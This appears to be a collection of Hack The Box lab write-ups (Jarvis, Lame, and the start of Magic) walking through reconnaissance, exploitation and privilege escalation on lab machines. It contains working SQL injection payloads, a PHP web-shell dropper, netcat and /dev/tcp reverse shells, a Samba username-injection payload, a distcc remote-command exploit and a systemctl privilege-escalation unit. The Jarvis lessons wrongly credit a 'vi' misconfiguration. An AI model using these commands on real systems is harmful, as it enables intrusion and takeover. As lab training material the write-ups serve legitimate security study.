http://10.10.10.143:64999/server-status (Status: 403) [Size: 303]
===============================================================
2020/01/10 10:51:32 Finished
===============================================================Finished gobuster scan
                                                                                                                                                                               
=========================
                                                                                                                                                                               
Starting nikto scan
                                                                                                                                                                               
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.143
+ Target Hostname:    10.10.10.143
+ Target Port:        64999
+ Start Time:         2020-01-10 10:51:34 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.25 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'ironwaf' found, with contents: 2.0.3
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.25 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7866 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2020-01-10 10:57:10 (GMT-5) (336 seconds)
--------------------------------------------------------------------
+ 1 host(s) testedFinished nikto scan
                                                                                                                                                                               
=========================
                                                                                                                                                                                                                                                                                                                                                      
                                                                                                                                                                               
---------------------Finished all Nmap scans---------------------
```

Before we move on to enumeration, let’s make some mental notes about the scan results. We have 3 open ports:

* **Port 22:** running OpenSSH 7.4p1
* **Port 80:** running Apache httpd 2.4.25
* **Port 64999:** running Apache httpd 2.4.25.

Let’s look at each port individually.

**Port 22**

* The OpenSSH version that is running on port 22 is not associated with any critical vulnerabilities, so it’s unlikely that we gain initial access through this port, unless we find credentials.

**Port 80**

* The gobuster scan on this web server showed three promising directories/files: _index.php_, _room.php_, _/phpmyadmin_.
* The Nikto scan found two extra files: _/icons/README_ and _/phpmyadmin/ChangeLog_. The ChangeLog file will be useful since it usually contains the phpMyAdmin version number.

**Port 64999**

* The gobuster and Nikto scans didn’t find anything useful for this port.

## Enumeration <a id="ab88"></a>

Let’s start off with enumerating port 80. Visit the application in the browser.

![](https://miro.medium.com/max/1132/1*lpgbR8gaow4XWn7KJ92I7w.png)

We get two domain names: _supersecurehotel.htb_ and _logger.htb_.

Add them to the _/etc/hosts_ file.

```text
10.10.10.143 supersecurehotel.htb logger.htb
```

Both of them seem to redirect to the same website. Next, view the page source to see if we can get any extra information, domains, etc. We don’t get anything useful.

Then visit all the links in the application. It seems to be all static content except for the _room.php_ page that takes in a _cod_ parameter and outputs the corresponding room information.

![](https://miro.medium.com/max/791/1*h_ibkpxgK3oGbwFDH2cnzw.png)

From previous experience, I can safely say that if this parameter field is vulnerable, it’s vulnerable to one of the following: LFI, RFI or SQLi. We’ll have to test for all three vulnerabilities.

Before we do that, let’s check the _phpmyadmin_ directory.

![](https://miro.medium.com/max/1151/1*hQR74jnrE_sn0qMTqDaZOw.png)

I tried default credentials but that didn’t work.

![](https://miro.medium.com/max/658/1*dABhwY1GlQ3TGHoQXgyCmw.png)

Next, view the _ChangeLog_ document to get the version number. This can also be found in the _README_ document that nikto reported.

![](https://miro.medium.com/max/786/1*fHnON1ZEPx1Cc7Sk72TsoQ.png)

The version is 4.8.0. Run searchsploit on the version number.

```text
searchsploit phpMyAdmin | grep  4\\.8\\.
```

We get back the following result.

![](https://miro.medium.com/max/1324/1*5tjGfKoRIP3ehGpdT6lSog.png)

The exploits require authentication, so we’ll have to first find credentials. For now, we’ve enumerated this port enough, so let move on to port 64999.

![](https://miro.medium.com/max/698/1*bFXVDapn0BHu6GaIN8eqdA.png)

It seems to only contain the above static text and didn’t get any directories/files from nikto and gobuster, so this port will not be useful to us.

Based on the enumeration results above, we have enough information to move on to the exploitation phase.

## Initial Foothold <a id="dd94"></a>

Go back to the _room.php_ page and try LFI/RFI payloads. I tried several, however, none of them worked. If you’re not familiar with how to test LFI/RFI vulnerabilities, refer to my [Poison writeup](https://medium.com/swlh/hack-the-box-poison-writeup-w-o-metasploit-a6acfdf52ac5).

Next, let’s try SQL injection. We know it’s using a MySQL database based on the _README_ document of _phpMyAdmin._ The first thing I’m going to try is a simple time-based SQL injection. If it takes longer than usual for the response to come back to me, then we know it’s vulnerable.

```text
http://10.10.10.143/room.php?cod=1%20or%20sleep(10)
```

The application did take about 10 seconds before it returned a response, which confirms to us that the backend is interpreting my sleep command as SQL code and running it. Therefore, this is for sure vulnerable to SQL injection.

> **Note:** I’m going to proceed with exploiting this vulnerability using SQLMap. This is a tool that is not allowed on the OSCP. Therefore, I added an **Extra Content** section at the end of the blog explaining how to exploit it manually.

Let’s confirm it’s vulnerable using SQLMap. Intercept the request in Burp.

![](https://miro.medium.com/max/798/1*x7oQTq3GbQJHFBJA3mvmCA.png)

Copy the content of the request and save it in the file request.txt.

```text
sqlmap -v 4 --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" -r request.txt
```

* **-v:** Verbosity level
* **— user-agent:** HTTP User-Agent header value
* **-r:** Load HTTP request from a file

We get back the following result confirming to us that the _cod_ parameter is vulnerable to SQL injection.

![](https://miro.medium.com/max/1426/1*QvsqR_KhXJ-jHdYTo7suEg.png)

SQLMap has a nice flag that enumerates the DBMS users’ password hashes and then attempts to crack them for you.

```text
sqlmap -v 4 --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" --passwords -r request.txt
```

* **— passwords:** Enumerate DBMS users password hashes

We get back the following result showing that not only did it find a password hash for the user DBadmin but it also cracked it.

![](https://miro.medium.com/max/1410/1*RrYP2A1EKGidTjgMswqUwA.png)

We can try this password on the _phpMyAdmin_ page.

![](https://miro.medium.com/max/1426/1*E5mZJFRcoEFZKu1c3JNaLw.png)

We’re in! Before I try to get command execution through the phpMyAdmin console, there’s another cool feature in SQLMap that will try to get a shell on the host running the web server.

```text
sqlmap -v 4 --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" --os-shell -r request.txt
```

* **— os-shell:** Prompt for an interactive operating system shell

![](https://miro.medium.com/max/1411/1*coZ8IlW9wPF4tOjHPyHKUg.png)

We have a shell! This goes to show how powerful this tool is, which is probably why it’s not allowed on the OSCP.

From here, we’ll send a reverse shell back to us. First, set up a listener on the attack machine.

```text
nc -nlvp 1234
```

Then visit [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), and get a bash reverse shell.

```text
nc -e /bin/sh 10.10.14.12 1234
```

Run the above command in the SQLMap shell.

![](https://miro.medium.com/max/781/1*ezN5fuPPIpY_LGGFNLf8LQ.png)

We get a shell! Let’s upgrade it to a better shell.

```text
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

This gives us a partially interactive bash shell. To get a fully interactive shell, background the session \(CTRL+ Z\) and run the following in your terminal which tells your terminal to pass keyboard shortcuts to the shell.

```text
stty raw -echo
```

Once that is done, run the command “fg” to bring netcat back to the foreground. Then use the following command to give the shell the ability to clear the screen.

```text
export TERM=xterm
```

Unfortunately, we’re running as the web daemon user _www-data_ and we don’t have privileges to view the user.txt flag. Therefore, we need to escalate privileges.

## Privilege Escalation <a id="b8df"></a>

Run the following command to view the list of allowed commands the user can run using sudo without a password.

```text
www-data@jarvis:/home/pepper$ sudo -l
Matching Defaults entries for www-data on jarvis:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/binUser www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
```

As can be seen above, we have the right to run the file _simpler.py_ with pepper’s privileges. Let’s view the permissions on the file.

```text
www-data@jarvis:/home/pepper$ ls -la /var/www/Admin-Utilities/
total 16
drwxr-xr-x 2 pepper pepper 4096 Mar  4  2019 .
drwxr-xr-x 4 root   root   4096 Mar  4  2019 ..
-rwxr--r-- 1 pepper pepper 4587 Mar  4  2019 simpler.py
```

We can read the file. Let’s view the file content to see if we can exploit it to escalate our privileges to pepper.

```text
#!/usr/bin/env python3
from datetime import datetime
import sys
import os
from os import listdir
import redef show_help():
    message='''
********************************************************
* Simpler   -   A simple simplifier ;)                 *
* Version 1.0                                          *
********************************************************
Usage:  python3 simpler.py [options]Options:
    -h/--help   : This help
    -s          : Statistics
    -l          : List the attackers IP
    -p          : ping an attacker IP
    '''
    print(message)......def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)
if __name__ == '__main__':
    show_header()
    if len(sys.argv) != 2:
        show_help()
        exit()
    if sys.argv[1] == '-h' or sys.argv[1] == '--help':
        show_help()
        exit()
    elif sys.argv[1] == '-s':
        show_statistics()
        exit()
    elif sys.argv[1] == '-l':
        list_ip()
        exit()
    elif sys.argv[1] == '-p':
        exec_ping()
        exit()
    else:
        show_help()
        exit()
```

The “_-p_” option calls the _exec\_ping\(\)_ command. This command takes in user provided input and checks if the following characters are part of the input: ‘&’, ‘;’, ‘-’, ‘\`’, ‘\|\|’, ‘\|’. If it finds one of these characters, it prints out the message “Got you” and terminates the program. Otherwise, it executes the ping command on the user provided input.

Notice that the dollar sign is allowed, so I can use that to get a privileged shell. Take for example the following command.

```text
www-data@jarvis:/var/www/Admin-Utilities$ ping $(whoami)ping: www-data: Temporary failure in name resolution
```

Whatever is in the parenthesis will be executed first and the output of it will be passed to the ping command. Therefore, as can be seen in the above output, it resolved the _whoami_ command to “_www-data_” and then it tried to ping the output of the command.

So to escalate our privileges to pepper, in the IP address field, we just run the $\(/bin/bash\) command.

```text
www-data@jarvis:/$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p 
***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************Enter an IP: $(/bin/bash)
pepper@jarvis:/$ whoami
pepper@jarvis:/$ cat /home/pepper/user.txt
```

We’re pepper! I tried running a few commands, but something seems to be wrong with my shell, so instead I sent a new reverse shell \(done in the same way as earlier\) back to my attack machine and upgraded it to a fully interactive shell.

Now we can view the user.txt flag.

![](https://miro.medium.com/max/686/1*MijyVJ7Njc-gyI3Jq0n4Sw.png)

To view the root.txt flag, we need to escalate our privileges to root.

Let’s transfer the LinEnum script from our attack machine to the target machine.

In the attack machine, start up a server in the same directory that the script resides in.

```text
python -m SimpleHTTPServer 5555
```

In the target machine, change to the /tmp directory where we have write privileges and download the LinEnum script.

```text
cd /tmp
wget http://10.10.14.12:5555/LinEnum.sh
```

Give it execute privileges.

```text
chmod +x LinEnum.sh
```

Run the script.

```text
./LinEnum.sh
```

We get back the following result.

```text
.....

[-] SUID files:
-rwsr-xr-x 1 root root 30800 Aug 21  2018 /bin/fusermount
-rwsr-xr-x 1 root root 44304 Mar  7  2018 /bin/mount
-rwsr-xr-x 1 root root 61240 Nov 10  2016 /bin/ping
-rwsr-x--- 1 root pepper 174520 Feb 17  2019 /bin/systemctl
-rwsr-xr-x 1 root root 31720 Mar  7  2018 /bin/umount
-rwsr-xr-x 1 root root 40536 May 17  2017 /bin/su
-rwsr-xr-x 1 root root 40312 May 17  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 59680 May 17  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 75792 May 17  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 40504 May 17  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 140944 Jun  5  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 50040 May 17  2017 /usr/bin/chfn.....
```

The _systemctl_ binary has the setuid bit set and it’s owned by root. We can use that to our advantage and escalate to root privileges. If you’re not sure how to do that, you can search the binary name on [GTFOBins](https://gtfobins.github.io/) and check how the suid bit can be used to escalate privileges.

![](https://miro.medium.com/max/838/1*pD6dkx0nxEvx9A0YYGO_5A.png)

There’s a good blog written by [Samual Whang](https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49) explaining how to set up a service and use the misconfigured _systemctl_ binary to send a privileged reverse shell back to our attack machine.

First, create a _root.service_ file with the following content.

```text
[Unit]
Description=get root privilege[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.12/9999 0>&1'[Install]
WantedBy=multi-user.target
```

Transfer it to the target machine. Then run the following command.

```text
/bin/systemctl enable /home/pepper/root.service
```

This command will hook the specified unit to the correct place so that _root.service_ is started automatically on boot.

Next, set up a listener on your attack machine to receive the reverse shell.

```text
nc -nlvp 9999
```

In the target machine, start the root service.

```text
/bin/systemctl start root
```

We get a shell! Grab the root.txt flag.

![](https://miro.medium.com/max/900/1*cN3cOzN257US5QkNJMhokA.png)

## Extra Content \(Manual Exploitation\) <a id="24e2"></a>

Since SQLMap is not allowed on the OSCP, let’s try to get initial access without having to use it.

We suspect that the application is vulnerable to SQL injection because of the way it responded to the _sleep\(\)_ command. In order to verify our suspicion, we need to first deduce the structure of the SQL query that is running in the backend and then exploit it.

**Step 1 — Column Enumeration**

The first thing in figuring out the structure of a SQL query is determining how many columns the query is using. This can be done using the SQL ORDER BY keyword.

The following is a sample SQL statement.

```text
Select * FROM table
ORDER BY column-name
```

The above statement prints out all the columns in the table “table” and orders the result based on the column “column-name”. The interesting thing about ORDER BY is that you can use an integer instead of a column name.

```text
Select * FROM table
ORDER BY 1
```

So the above statement prints out all the columns in the table “table” and orders the result based on the first column in the table. How can we abuse that? Well, what happens when we try to order by a column that does not exist? It’s one of two options — either the application starts behaving weirdly or it throws an error based on the validation that is being done at the backend.

So in order to enumerate the number of columns, we’ll incrementally use the ORDER BY keyword until the application either throws an error or no longer gives us a result.

Let’s try that on our target application.

![](https://miro.medium.com/max/733/1*J5mv3CQZqpgMREE2iEAn_g.png)

Based on the output of the page, the query is using at least six columns: id \(likely cod\), rating, image URL, image title, price and room description. Let’s confirm that using the ORDER BY keyword.

![](https://miro.medium.com/max/658/1*pScD0wgjn7ahYkItVbwEPw.png)

We still get an image so we know for sure that the query is using at least 6 columns. Next, let’s try 7 columns.

```text
http://10.10.10.143/room.php?cod=1%20order%20by%207
```

Same result. Let’s move on to 8.

![](https://miro.medium.com/max/823/1*BVY8uSqQr3ceJjXVgXccuw.png)

We get nothing! So now we’re sure that the query is using exactly 7 columns. The next thing to do is determine which of these columns are getting outputted on the page. The reason for that will become clear in step 3.

**Step 2 — Column Presentation and Type**

To determine where the column result is being outputted on the page, you can use the SQL UNION operator.

The following is a sample query.

```text
SELECT column-name-1 FROM table1
UNION
SELECT column-name-2 FROM table2;
```

The above statement first does select on “column-name-1” from “table1” and then does a select on “column-name-2” from “table-2” and uses the UNION operator to combine the results of the two select statements. Note that the number of columns have to be the same in both select statements for the query to work.

Now consider the following select statement.

```text
SELECT column-name-1 FROM table1
UNION
SELECT 1
```

The first select statement does a query on “column-name-1” from “table1” and the second select statement simply prints out the value 1. The union of these two statements is the combination of the results. Depending on certain conditions such as matching data types of the columns, the above query might generate an error. So keep that in mind.

Back to our target application, let’s try the union statement.

![](https://miro.medium.com/max/752/1*zvuTN2BF3t6DzoqdgvmZ_w.png)

We get the output of the first select statement, but not the second. A possible reason is that the application only prints one entry at a time. So let’s modify our query to give the first select statement a _cod_ value that doesn’t exist so that it prints out the result from the second statement.

![](https://miro.medium.com/max/861/1*X1lt9nZNATn8t50Zn7ro2g.png)

Perfect, now we know which columns correspond to the elements in the page. The second parameter of the select statement was originally “Superior Family Room” so we know the data type of that row is probably string. Since we are going to retrieve backend information that is in string format, we will work with the second parameter.

**Step 3— Retrieve Backend Information**

[Pentestmonkey](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet) has a list of useful queries that can be used to enumerate the database. For example, you can use the “_SELECT @@version_” query in order to find the database version information.

![](https://miro.medium.com/max/852/1*0-Bp1iWMgVJnoy4BR4xbLA.png)

Now we know it’s using MariaDB version 10.1.37. Next, let’s use the following command to print out the list of password hashes.

```text
SELECT host, user, password FROM mysql.user
```

![](https://miro.medium.com/max/1029/1*hr3ez9KjTDb_RFO2OZjjOg.png)

We get nothing because we’re querying more than one column in the sub select query. Let’s verify that by just outputting the password column.

```text
SELECT password FROM mysql.user
```

![](https://miro.medium.com/max/994/1*qujhsF7FrdWIY_iuDvy58w.png)

We get a hash! In order to output multiple columns, you can use the group\_concat\(\) function.

```text
SELECT group_concat(host,user,password) FROM mysql.user
```

![](https://miro.medium.com/max/1091/1*xKw6e8lMU__rlQeS9qzthg.png)

It worked! Now we know that the database is running on localhost, the user is DBadmin and the hash is 2D2B7A5E4E637B8FBA1D17F40318F277D29964D0. We can crack the hash quickly using [crackstation.net](https://crackstation.net/).

![](https://miro.medium.com/max/838/1*vQs-W0NO6UBgw9PfAymmYA.png)

This is the manual version of how SQLMap found and cracked the password when we passed the “ — passwords” flag to it.

There’s another way of doing all of this using the LOAD\_FILE\(\) function. You simply pass in a file path and if MySQL has the permission to read it, it will be outputted on the screen.

![](https://miro.medium.com/max/876/1*ZZRA5ouqXlAaquu3jNnfJw.png)

This shows how dangerous it would be if MySQL was running as root. We would have been able to enumerate sensitive files on the system such as the /etc/shadow file. Unfortunately, that’s not the case for this box.

**Step 4— Command Execution**

Alright, the last step is to get command execution. Just like we can add the value “1” using a select statement, we can also add php code. However, we need to save that code into a file and then somehow call the file and execute the code.

First, get the php-reverse-shell script from [pentestmonkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) and make the relevant changes.

Second, set up a listener on your attack machine to receive that reverse shell.

```text
nc -nlvp 1234
```

Third, exploit the SQL injection to add php code into a file on the system. This involves two steps: \(1\) add php code that downloads the reverse shell script from the attack machine and saves it in a file on the target system, and \(2\) save the output of the query into a PHP file using the MYSQL INTO OUTFILE statement.

```text
9999 union select 1,(select '<?php exec(\"wget -O /var/www/html/shell.php http://10.10.14.12:5555/php-reverse-shell.php\");?>'),3,4,5,6,7 INTO OUTFILE '/var/www/html/test4.php'
```

What the above query does, is it saves the entire query \(including the PHP code\) into the file /var/www/html/test4.php. This is the root directory of the web server. So when we call the test4.php script, it will execute the php code that we included in our select statement and download the reverse shell.

Since the php code downloads the script from our attack machine, we first need to set up a simple python server.

```text
python -m SimpleHTTPServer 5555
```

Then execute the script by calling it in the browser.

```text
http://10.10.10.143/test4.php
```

We can see that a GET request to the php-reverse-shell script was made on the python sever. This means that the php code executed. So far so good. The wget statement above downloads the file and saves it in the root directory with the file name shell.php. Therefore, to run our shell script, call it in the browser.

```text
http://10.10.10.143/shell.php
```

We get a shell!

![](https://miro.medium.com/max/1010/1*YHQHqsXtlelaqDdNkrHcrA.png)

This is the manual version of how SQLMap probably got a shell on the target system when we added the “ — os-shell” ****flag.

**Note:** Ippsec has a [great video](https://www.youtube.com/watch?v=YHHWvXBfwQ8) explaining how to manually exploit SQL injections. It’s slightly different than the methodology that I used but covers many other concepts.

## Lessons Learned <a id="3185"></a>

To gain an initial foothold on the box we exploited one vulnerability.

1. SQL Injection. SQL injection occurs when the application takes in user input and interprets and runs that input as SQL commands. This is a result of insufficient input validation. To prevent this vulnerability from occurring, there are [many defenses ](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)that can be put in place, including but not limited to the use of parametrized queries.

To escalate privileges we exploited two vulnerabilities.

1. Command injection & SUID misconfiguration. The simpler.py file had the SUID bit configured and the file was used to run system commands. Although the application did validate user input by blacklisting a set of characters, we were able to bypass validation by using the $ character to get a privileged shell. To prevent this vulnerability from occurring, there are [many defenses](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html) that can be put in place, including but not limited to the use of libraries or APIs as an alternative to calling OS commands directly. Similarly, when setting the SUID bit, administrators should carefully analyze their SUID/GUID applications to determine if they legitimately require elevated permissions.
2. Security misconfiguration of the vi binary. A non-root user was given the ability to run vi with root privileges. Since vi has the ability of running a shell, we were able to exploit that to get a shell with root privileges. Again, the administrator should have conformed to the principle of least privilege.

# -------------------------------FIN-------------------------------------
# ----------------------DEBUT------------------------------
lame-writeup-w-o-metasploit.md
# Lame Writeup w/o Metasploit

![](https://miro.medium.com/max/593/1*7Wkk8qE92Mwf1nWWbYS5mA.png)

## Reconnaissance <a id="491d"></a>

First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports.

```text
nmap -sC -sV -O -oA nmap/initial 10.10.10.3
```

* **-sC**: run default nmap scripts
* **-sV**: detect service version
* **-O**: detect OS
* **-oA**: output all formats and store in file _nmap/initial_

We get back the following result showing that these ports are open:

* **Port 21:** running File Transfer Protocol \(FTP\) version 2.3.4. This allows anonymous login so we should keep that in mind.
* **Port 22:** running OpenSSH version 4.7p1.
* **Ports 139 and 445:** are running Samba v3.0.20-Debian.

![](https://miro.medium.com/max/973/1*fGBlZBuqIXOGRCWOVXqC9A.png)

Before we start investigating these ports, let’s run more comprehensive nmap scans in the background to make sure we cover all bases.

Let’s run an nmap scan that covers all ports.

```text
nmap -sC -sV -O -p- -oA nmap/full 10.10.10.3
```

We get back the following result.

![](https://miro.medium.com/max/970/1*amZ5cn573yjsLh-TaxPBhQ.png)

We have a new port that did not show up in the initial scan.

* **Port 3632**: running the distributed compiler daemon distcc version 1.

Similarly, we run an nmap scan with the **-sU** flag enabled to run a UDP scan.

```text
nmap -sU -O -p- -oA nmap/udp 10.10.10.3
```

We get back the following result. As can be seen, all ports are either filtered or closed.

![](https://miro.medium.com/max/635/1*-SGvjjvid3UP15zWl8HouA.png)

Our initial recon shows that we potentially have four different points of entry to this machine.

## Enumeration <a id="000d"></a>

Let’s enumerate more to determine if any of these services are either misconfigured or running vulnerable versions.

**Port 21 vsftpd v2.3.4**

A quick google search shows us that this version is famously vulnerable to a backdoor command execution that is triggered by entering a string that contains the characters “:\)” as the username. When the backdoor is triggered, the target machine opens a shell on port 6200. This exploit is simple enough to exploit manually but we’re trying to move to more automation so let’s see if there is an nmap script that already checks for that.

```text
ls /usr/share/nmap/scripts/ftp*
```

![](https://miro.medium.com/max/843/1*Pz3xeIU0zH-_eSO-OBSnGw.png)

Execute the script on port 21 of the target machine.

```text
nmap --script ftp-vsftpd-backdoor -p 21 10.10.10.3
```

![](https://miro.medium.com/max/673/1*qge5OrhEMmOqP4telrNoXw.png)

The script output shows that we’re not vulnerable to this vulnerability. Let’s move on to our second point of entry.

**Port 22 OpenSSH v4.7p1**

After a quick google search, nothing major pops up. Nmap contains multiple scripts that can brute force credentials amongst other things.

```text
ls /usr/share/nmap/scripts/ssh*
```

![](https://miro.medium.com/max/922/1*iEwTbzQMZUpIb8-T0_9c3A.png)

This might take a while and could potentially lead us nowhere so we’ll put this on the back burner and get back to it later if the other points of entry don’t pan out.

**Ports 139 and 445 Samba v3.0.20-Debian**

I have high hopes to gain at least an initial foothold using these ports.

Let’s use smbclient to access the SMB server.

```text
smbclient -L 10.10.10.3
```

* **-L**: lists what services are available on a server

Anonymous login is allowed.

![](https://miro.medium.com/max/758/1*JdVThushZEi-2L9CkVK3Sg.png)

Let’s view the permissions on the share drives.

```text
smbmap -H 10.10.10.3
```

* **-H**: IP of host

We get back the following result. Interesting! We have READ/WRITE access on the tmp folder.

![](https://miro.medium.com/max/736/1*0rkC0bR4rxpvEFHd4vokow.png)

Let’s go back to our google friend to see if this version of Samba is vulnerable. It seems to have had its fair share of [vulnerabilities](https://www.cvedetails.com/vulnerability-list/vendor_id-102/product_id-171/version_id-41384/Samba-Samba-3.0.20.html). We’re looking for a code execution vulnerability that would ideally give us Admin access. After going through all the code execution vulnerabilities, the simplest one that won’t require me to use Metasploit is [CVE-2007–2447](https://www.cvedetails.com/cve/CVE-2007-2447/).

The issue seems to be with the username field. If we send shell metacharacters into the username we exploit a vulnerability which allows us to execute arbitrary commands. Although the [exploit](https://www.exploit-db.com/exploits/16320) available on exploitdb uses Metasploit, reading through the code tells us that all the script is doing is running the following command, where “payload.encoded” would be a reverse shell sent back to our attack machine.

```text
"/=`nohup " + payload.encoded + "`"
```

Before we exploit this, let’s look at our last point of entry.

**Port 3632** **distcc v1**

Googling “distcc v1” reveals that this service is vulnerable to a remote code execution and there’s an nmap script that can verify that.

```text
nmap --script distcc-cve2004-2687 -p 3632 10.10.10.3
```

The result shows us that it’s vulnerable!

![](https://miro.medium.com/max/725/1*kPeaLZx-dDl2QuHjHg2GtA.png)

So we have two potential ways to exploit this machine.

## Exploitation \#1: Samba <a id="fcd7"></a>

Add a listener on attack machine.

```text
nc -nlvp 4444
```

Log into the smb client.

```text
smbclient //10.10.10.3/tmp
```

As mentioned in the previous section, we’ll send shell metacharacters into the username with a reverse shell payload.

```text
logon "/=`nohup nc -nv 10.10.14.6 4444 -e /bin/sh`"
```

The shell connects back to our attack machine and we have root! In this scenario, we didn’t need to escalate privileges.

![](https://miro.medium.com/max/719/1*DdvA5iSrtgHA7NTjHO527A.png)

Grab the user flag.

![](https://miro.medium.com/max/519/1*W-JJhSQNW8QMzh2M1XoUbA.png)

Grab the root flag.

![](https://miro.medium.com/max/572/1*EFS66PmJse9YpGTSus10wA.png)

## Exploitation \#2: Distcc <a id="714d"></a>

In the previous section, we saw that this service is vulnerable to CVE 2004–2687 and there’s an nmap script that can be used to exploit this vulnerability and run arbitrary commands on the target machine.

First, start a listener on the attack machine.

```text
nc -nlvp 4444
```

Then, use the nmap script to send a reverse shell back to the attack machine.

```text
nmap -p 3632 10.10.10.3 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='nc -nv 10.10.14.6 4444 -e /bin/bash'"
```

![](https://miro.medium.com/max/722/1*XGycXseoW7pDQLJnfN6PwA.png)

The shell connects back to our attack machine and we have a non privileged shell!

![](https://miro.medium.com/max/692/1*a6yMG05f7RV-LU2091HSBQ.png)

We’ll need to escalate privileges. Google the OS version — Linux 2.6.24 to see if it is vulnerable to any exploits. I tried [CVE 2016–5195](https://www.exploit-db.com/exploits/40839) and [CVE 2008–0600](https://www.exploit-db.com/exploits/5093), but they didn’t work.

Let’s try [CVE 2009–1185](https://www.exploit-db.com/exploits/8572). Download the exploit from searchsploit.

```text
searchsploit -m 8572.c
```

Start up a server on your attack machine.

```text
python -m SimpleHTTPServer 9005
```

In the target machine download the exploit file.

```text
wget http://10.10.14.6:5555/8572.c
```

Compile the exploit.

```text
gcc 8572.c -o 8572
```

To run it, let’s look at the usage instructions.

![](https://miro.medium.com/max/677/1*I7M6fBne0AtCu96yQhG2eQ.png)

We need to do two things:

* Figure out the PID of the udevd netlink socket
* Create a run file in /tmp and add a reverse shell to it. Since any payload in that file will run as root, we’ll get a privileged reverse shell.

To get the PID of the udevd process, run the following command.

```text
ps -aux | grep devd
```

![](https://miro.medium.com/max/784/1*4zJv2v2CWRwcyAuQ9PNjIA.png)

Similarly, you can get it through this file as mentioned in the instructions.

![](https://miro.medium.com/max/623/1*JIArJfTIn6IPx7J8jV6NUw.png)

Next, create a **run** file in /tmp and add a reverse shell to it.

![](https://miro.medium.com/max/471/1*SFdTIwhLSQtQX_jdSN7B_Q.png)

Confirm that the reverse shell was added correctly.

![](https://miro.medium.com/max/522/1*-77rPpCHax0hvwOo42FSWA.png)

Set up a listener on your attack machine to receive the reverse shell.

```text
nc -nlvp 4445
```

Run the exploit on the attack machine. As mentioned in the instructions, the exploit takes the PID of the udevd netlink socket as an argument.

```text
./8572 2661
```

We have root!

![](https://miro.medium.com/max/610/1*cW-sxid7icV3oHaN-5w3tQ.png)

We solved this machine in two different ways!

## Lessons Learned <a id="31ac"></a>

1. Always run a full port scan! We wouldn’t have discovered the vulnerable distributed compiler daemon distcc running on port 3632 if we only ran the initial scan. This gave us an initial foothold on the machine where we were eventually able to escalate privileges to root.
2. Always update and patch your software! In both exploitation methods, we leveraged publicly disclosed vulnerabilities that have security updates and patches available.
3. Samba ports should not be exposed! Use a firewall to deny access to these services from outside your network. Moreover, restrict access to your server to valid users only and disable WRITE access if not necessary.

# -------------------------------FIN-------------------------------------
# ----------------------DEBUT------------------------------
magic-writeup-w-o-metasploit.md
# Magic Writeup w/o Metasploit

![Image for post](https://miro.medium.com/max/594/1*j2Q42VFXL2vn_RM5kNrovA.png)

When working on the initial foothold of this box, I found it to be very similar to an exercise I worked on in the OSWE labs and therefore, made the decision to solve this box in a slightly different way.

The blog will be divided into three sections:

* **Box Walkthrough:** _****_This section provides a walkthrough of how to solve the box.
* **Automated Script\(s\):** This section automates the web application attack vector\(s\) of the box. This is in an effort to improve my scripting skills for the OSWE certification.
* **Code Review:** This section dives into the web application code to find out what portion\(s\) of the insecure code introduced the vulnerabilities. Again, this is in an effort to improve my code review skills for the OSWE certification.

## Box Walkthrough <a id="3395"></a>

This section provides a walkthrough of how to solve the box.

### Reconnaissance <a id="65a8"></a>

Run [AutoRecon](https://github.com/Tib3rius/AutoRecon) to enumerate open ports and services running on those ports.

```text
autorecon.py 10.10.10.185
```

View the full TCP port scan results.

```text
root@kali:~/# cat _full_tcp_nmap.txt 
...
Not shown: 65533 closed ports
Reason: 65533 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
... 
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))                   
| http-methods:                                                                      
